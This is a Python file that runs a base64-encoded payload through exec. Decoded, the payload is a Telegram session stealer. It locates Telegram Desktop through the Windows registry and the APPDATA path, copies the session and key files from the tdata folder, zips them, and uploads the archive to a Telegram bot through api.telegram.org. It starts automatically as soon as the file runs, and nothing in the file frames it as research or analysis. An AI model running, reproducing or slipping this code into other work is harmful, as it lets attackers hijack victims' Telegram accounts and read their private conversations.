from base64 import b64decode
exec(b64decode(b'aW1wb3J0IG9zCmltcG9ydCBzaHV0aWwKaW1wb3J0IHJlCnRyeToKICAgIGltcG9ydCByZXF1ZXN0cwpleGNlcHQ6CiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJykKICAgIGltcG9ydCByZXF1ZXN0cwppbXBvcnQgemlwZmlsZQppbXBvcnQgdXVpZAoKdHJ5OgogICAgZnJvbSB3aW5yZWcgaW1wb3J0IEhLRVlfQ0xBU1NFU19ST09ULCBIS0VZX0NVUlJFTlRfVVNFUiwgT3BlbktleSwgUXVlcnlWYWx1ZUV4CmV4Y2VwdDoKICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgd2lucmVnJykKICAgIGZyb20gd2lucmVnIGltcG9ydCBIS0VZX0NMQVNTRVNfUk9PVCwgSEtFWV9DVVJSRU5UX1VTRVIsIE9wZW5LZXksIFF1ZXJ5VmFsdWVFeAoKClRFTEVHUkFNX0NIQVRfSUQgPSAiaWQtaGVyZSIKVEVMRUdSQU1fVE9LRU4gPSAidG9rZW4taGVyZSIKVEVNUF9ESVJFQ1RPUlkgPSBvcy5wYXRoLmpvaW4ob3MuZ2V0ZW52KCdURU1QJywgJy90bXAnKSwgJ3RkYXRhJykKCgpkZWYgZmluZF90ZWxlZ3JhbV9leGVjdXRhYmxlcygpOgogICAgdGVsZWdyYW1fcGF0aHMgPSBbXQoKICAgIFJPT1RfUkVHSVNUUllfS0VZUyA9IFsKICAgICAgICAidGRlc2t0b3AudGdcXHNoZWxsXFxvcGVuXFxjb21tYW5kIiwKICAgICAgICAidGdcXERlZmF1bHRJY29uIiwKICAgICAgICAidGdcXHNoZWxsXFxvcGVuXFxjb21tYW5kIgogICAgXQogICAgVVNFUl9SRUdJU1RSWV9LRVlTID0gWwogICAgICAgICJTT0ZUV0FSRVxcQ2xhc3Nlc1xcdGRlc2t0b3AudGdcXERlZmF1bHRJY29uIiwKICAgICAgICAiU09GVFdBUkVcXENsYXNzZXNcXHRkZXNrdG9wLnRnXFxzaGVsbFxcb3BlblxcY29tbWFuZCIsCiAgICAgICAgIlNPRlRXQVJFXFxDbGFzc2VzXFx0Z1xcRGVmYXVsdEljb24iLAogICAgICAgICJTT0ZUV0FSRVxcQ2xhc3Nlc1xcdGdcXHNoZWxsXFxvcGVuXFxjb21tYW5kIgogICAgXQoKICAgIGRlZiBjbGVhbl9yZWdpc3RyeV92YWx1ZShyZWdpc3RyeV92YWx1ZSk6CiAgICAgICAgaWYgcmVnaXN0cnlfdmFsdWUuc3RhcnRzd2l0aCgiXCIiKToKICAgICAgICAgICAgcmVnaXN0cnlfdmFsdWUgPSByZWdpc3RyeV92YWx1ZVsxOl0KICAgICAgICAgICAgaWYgcmVnaXN0cnlfdmFsdWUuZW5kc3dpdGgoIiwxXCIiKToKICAgICAgICAgICAgICAgIHJlZ2lzdHJ5X3ZhbHVlID0gcmVnaXN0cnlfdmFsdWUucmVwbGFjZSgiLDFcIiIsICIiKQogICAgICAgICAgICBlbGlmIHJlZ2lzdHJ5X3ZhbHVlLmVuZHN3aXRoKCJcIiAgLS0gXCIlMVwiIik6CiAgICAgICAgICAgICAgICByZWdpc3RyeV92YWx1ZSA9IHJlZ2lzdHJ5X3ZhbHVlLnJlcGxhY2UoIlwiICAtLSBcIiUxXCIiLCAiIikKICAgICAgICByZXR1cm4gcmVnaXN0cnlfdmFsdWUKCiAgICB0cnk6CiAgICAgICAgdGVsZWdyYW1fZmlsZSA9IG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ0FQUERBVEEnKSwgIlRlbGVncmFtIERlc2t0b3BcXFRlbGVncmFtLmV4ZSIpCiAgICAgICAgaWYgb3MucGF0aC5leGlzdHModGVsZWdyYW1fZmlsZSk6CiAgICAgICAgICAgIHRlbGVncmFtX3BhdGhzLmFwcGVuZCh0ZWxlZ3JhbV9maWxlKQoKICAgICAgICBmb3IgcmVnaXN0cnlfa2V5IGluIFJPT1RfUkVHSVNUUllfS0VZUzoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgd2l0aCBPcGVuS2V5KEhLRVlfQ0xBU1NFU19ST09ULCByZWdpc3RyeV9rZXkpIGFzIGtleToKICAgICAgICAgICAgICAgICAgICBleGVjdXRhYmxlX3BhdGggPSBRdWVyeVZhbHVlRXgoa2V5LCAiIilbMF0KICAgICAgICAgICAgICAgICAgICBleGVjdXRhYmxlX3BhdGggPSBjbGVhbl9yZWdpc3RyeV92YWx1ZShleGVjdXRhYmxlX3BhdGgpCiAgICAgICAgICAgICAgICAgICAgaWYgZXhlY3V0YWJsZV9wYXRoIG5vdCBpbiB0ZWxlZ3JhbV9wYXRoczoKICAgICAgICAgICAgICAgICAgICAgICAgdGVsZWdyYW1fcGF0aHMuYXBwZW5kKGV4ZWN1dGFibGVfcGF0aCkKICAgICAgICAgICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgICAgICAgICAgcGFzcwoKICAgICAgICBmb3IgcmVnaXN0cnlfa2V5IGluIFVTRVJfUkVHSVNUUllfS0VZUzoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgd2l0aCBPcGVuS2V5KEhLRVlfQ1VSUkVOVF9VU0VSLCByZWdpc3RyeV9rZXkpIGFzIGtleToKICAgICAgICAgICAgICAgICAgICBleGVjdXRhYmxlX3BhdGggPSBRdWVyeVZhbHVlRXgoa2V5LCAiIilbMF0KICAgICAgICAgICAgICAgICAgICBleGVjdXRhYmxlX3BhdGggPSBjbGVhbl9yZWdpc3RyeV92YWx1ZShleGVjdXRhYmxlX3BhdGgpCiAgICAgICAgICAgICAgICAgICAgaWYgZXhlY3V0YWJsZV9wYXRoIG5vdCBpbiB0ZWxlZ3JhbV9wYXRoczoKICAgICAgICAgICAgICAgICAgICAgICAgdGVsZWdyYW1fcGF0aHMuYXBwZW5kKGV4ZWN1dGFibGVfcGF0aCkKICAgICAgICAgICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgICAgICAgICAgcGFzcwoKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcGFzcwoKICAgIHJldHVybiB0ZWxlZ3JhbV9wYXRocwoKCmRlZiBoYXNfdGVsZWdyYW1fZGF0YV9mb2xkZXIoZGlyZWN0b3J5KToKICAgIHJldHVybiBvcy5wYXRoLmV4aXN0cyhvcy5wYXRoLmpvaW4oZGlyZWN0b3J5LCAidGRhdGEiKSkKCgpkZWYgaXNfc2Vzc2lvbl9maWxlKGZpbGUpOgogICAgZmlsZV9uYW1lID0gb3MucGF0aC5iYXNlbmFtZShmaWxlKQoKICAgIGlmIGZpbGVfbmFtZSBpbiAoImtleV9kYXRhcyIsICJtYXBzIiwgImNvbmZpZ3MiKToKICAgICAgICByZXR1cm4gVHJ1ZQoKICAgIHJldHVybiByZS5tYXRjaChyIltBLVowLTldK1thLXowLTldP3M/IiwgZmlsZV9uYW1lKSBpcyBub3QgTm9uZSBhbmQgb3MucGF0aC5nZXRzaXplKGZpbGUpIDw9IDExMjY0CgoKZGVmIGlzX3ZhbGlkX2ZvbGRlcihmb2xkZXJfbmFtZSk6CiAgICByZXR1cm4gcmUubWF0Y2gociJbQS1aMC05XStbYS16XT8kIiwgZm9sZGVyX25hbWUpIGlzIG5vdCBOb25lCgoKZGVmIHNlbmRfdG9fdGVsZWdyYW0oZmlsZV9wYXRoKToKICAgIHVybCA9IGYiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtURUxFR1JBTV9UT0tFTn0vc2VuZERvY3VtZW50IgogICAgZmlsZXMgPSB7J2RvY3VtZW50Jzogb3BlbihmaWxlX3BhdGgsICdyYicpfQogICAgZGF0YSA9IHsnY2hhdF9pZCc6IFRFTEVHUkFNX0NIQVRfSUR9CiAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBmaWxlcz1maWxlcywgZGF0YT1kYXRhKQogICAgcmV0dXJuIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMAoKCmRlZiBzdGVhbF9zZXNzaW9ucygpOgogICAgZm9yIHRlbGVncmFtX3BhdGggaW4gZmluZF90ZWxlZ3JhbV9leGVjdXRhYmxlcygpOiAgICAgICAgCiAgICAgICAgdHJ5OgoKICAgICAgICAgICAgdW5pcXVlX2ZvbGRlcl9uYW1lID0gc3RyKHV1aWQudXVpZDQoKSkKICAgICAgICAgICAgc2Vzc2lvbl9kaXJlY3RvcnkgPSBvcy5wYXRoLmpvaW4oVEVNUF9ESVJFQ1RPUlksIHVuaXF1ZV9mb2xkZXJfbmFtZSkKCiAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhzZXNzaW9uX2RpcmVjdG9yeSk6CiAgICAgICAgICAgICAgICBvcy5tYWtlZGlycyhzZXNzaW9uX2RpcmVjdG9yeSkKCiAgICAgICAgICAgIHRlbGVncmFtX2ZvbGRlciA9IG9zLnBhdGguZGlybmFtZSh0ZWxlZ3JhbV9wYXRoKQogICAgICAgICAgICBpZiBoYXNfdGVsZWdyYW1fZGF0YV9mb2xkZXIodGVsZWdyYW1fZm9sZGVyKToKICAgICAgICAgICAgICAgIHRkYXRhX2ZvbGRlciA9IG9zLnBhdGguam9pbih0ZWxlZ3JhbV9mb2xkZXIsICJ0ZGF0YSIpCgogICAgICAgICAgICAgICAgdGRhdGFfdGVtcF9mb2xkZXIgPSBvcy5wYXRoLmpvaW4oc2Vzc2lvbl9kaXJlY3RvcnksICJ0ZGF0YSIpCiAgICAgICAgICAgICAgICBvcy5tYWtlZGlycyh0ZGF0YV90ZW1wX2ZvbGRlcikKCiAgICAgICAgICAgICAgICBmb3Igcm9vdCwgZGlycywgZmlsZXMgaW4gb3Mud2Fsayh0ZGF0YV9mb2xkZXIpOgogICAgICAgICAgICAgICAgICAgIGZvciBkaXIgaW4gZGlyczoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IGlzX3ZhbGlkX2ZvbGRlcihkaXIpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlycy5yZW1vdmUoZGlyKSAgCgogICAgICAgICAgICAgICAgICAgIGZvciBmaWxlIGluIGZpbGVzOgogICAgICAgICAgICAgICAgICAgICAgICBzb3VyY2VfcGF0aCA9IG9zLnBhdGguam9pbihyb290LCBmaWxlKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBpc19zZXNzaW9uX2ZpbGUoc291cmNlX3BhdGgpOgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlbGF0aXZlX3BhdGggPSBvcy5wYXRoLnJlbHBhdGgoc291cmNlX3BhdGgsIHRkYXRhX2ZvbGRlcikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhcmdldF9wYXRoID0gb3MucGF0aC5qb2luKHRkYXRhX3RlbXBfZm9sZGVyLCByZWxhdGl2ZV9wYXRoKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLm1ha2VkaXJzKG9zLnBhdGguZGlybmFtZSh0YXJnZXRfcGF0aCksIGV4aXN0X29rPVRydWUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaHV0aWwuY29weTIoc291cmNlX3BhdGgsIHRhcmdldF9wYXRoKQoKICAgICAgICAgICAgICAgIHppcF9maWxlX3BhdGggPSBvcy5wYXRoLmpvaW4oVEVNUF9ESVJFQ1RPUlksIGYie3VuaXF1ZV9mb2xkZXJfbmFtZX0uemlwIikKICAgICAgICAgICAgICAgIHdpdGggemlwZmlsZS5aaXBGaWxlKHppcF9maWxlX3BhdGgsICd3JywgemlwZmlsZS5aSVBfREVGTEFURUQpIGFzIHppcGY6CiAgICAgICAgICAgICAgICAgICAgZm9yIHJvb3QsIF8sIGZpbGVzIGluIG9zLndhbGsoc2Vzc2lvbl9kaXJlY3RvcnkpOgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgZmlsZSBpbiBmaWxlczoKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB6aXBmLndyaXRlKG9zLnBhdGguam9pbihyb290LCBmaWxlKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcmNuYW1lPW9zLnBhdGgucmVscGF0aChvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSksIHNlc3Npb25fZGlyZWN0b3J5KSkKCiAgICAgICAgICAgICAgICBzZW5kX3RvX3RlbGVncmFtKHppcF9maWxlX3BhdGgpCgogICAgICAgICAgICAgICAgc2h1dGlsLnJtdHJlZShzZXNzaW9uX2RpcmVjdG9yeSkKCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBwcmludChlKQoKCnN0ZWFsX3Nlc3Npb25zKCk='))